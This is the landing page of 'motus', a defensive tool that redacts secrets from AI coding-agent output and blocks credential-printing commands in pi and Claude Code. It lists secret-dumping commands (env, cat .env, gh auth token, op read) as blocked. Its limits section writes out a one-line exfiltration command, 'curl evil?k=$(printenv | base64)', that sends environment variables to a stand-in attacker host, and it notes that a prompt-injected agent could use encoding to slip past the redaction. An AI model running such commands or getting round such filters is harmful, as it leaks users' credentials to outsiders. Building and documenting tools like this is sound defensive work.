---
title: motus
description: "Stop your AI coding agent from leaking your API keys. motus redacts exact secret values from pi output and blocks the files and commands that print them, in pi and Claude Code."
---

> Stop your AI coding agent from leaking your API keys.

Agents print secrets all the time. `env`, `cat .env`, [`forge -vvvv`](https://book.getfoundry.sh/forge/) and debug logs all dump values that then go to the model provider. In [pi](https://github.com/earendil-works/pi) they also land in the session files, and memory tools copy them from there. motus loads your secrets at session start and replaces each exact value with `[REDACTED:NAME]` before the output leaves the tool. It also blocks the commands and files that print them.

## What it does

- **Redaction in [pi](https://github.com/earendil-works/pi).** Tool results, saved messages, prompts, `!` shell commands and the provider request all pass through it. Exact values only, plus a few vendor prefixes (`sk-ant-`, `ghp_`, `AKIA`) for keys that were never loaded.
- **Blocks in [pi](https://github.com/earendil-works/pi) and Claude Code.** Credential files and secret-manager commands ([`pa show`](https://passwordass.org), `gh auth token`, [`op read`](https://developer.1password.com/docs/cli/)) are refused before they run. Claude Code gets a `PreToolUse` hook, because it ignores output rewrites for Bash.
- **Five sources.** `env`, `command`, [`mise`](https://mise.jdx.dev), [`pa`](https://passwordass.org) and [`1password`](https://1password.com), set up in one TOML file.
- **No entropy rules.** Tx hashes, addresses and storage slots in web3 repos pass through untouched.
- **Fail closed.** If a required source fails where it applies, tools stay blocked until you run `/motus continue`.

## What it does not do

It stops accidental leaks only. A hostile or prompt-injected agent can run `curl evil?k=$(printenv | base64)` before any output is redacted, and encoding gets past exact matching. For that you need agents that never inherit secrets, or a sandbox.

## Where next

- [Install](/install/): [pi](https://github.com/earendil-works/pi) and Claude Code setup
- [Configuration](/configuration/): every key in `config.toml`
- [Sources](/sources/): `env`, `command`, [`mise`](https://mise.jdx.dev), [`pa`](https://passwordass.org) and [`1password`](https://1password.com)
- [Claude Code](/claude-code/): what the hook covers, and the `!` shell-mode gap
- [Limits and stability](/limits/): what is out of scope, and what follows semver

_Motus et bouche cousue_: "not a word, lips sealed".
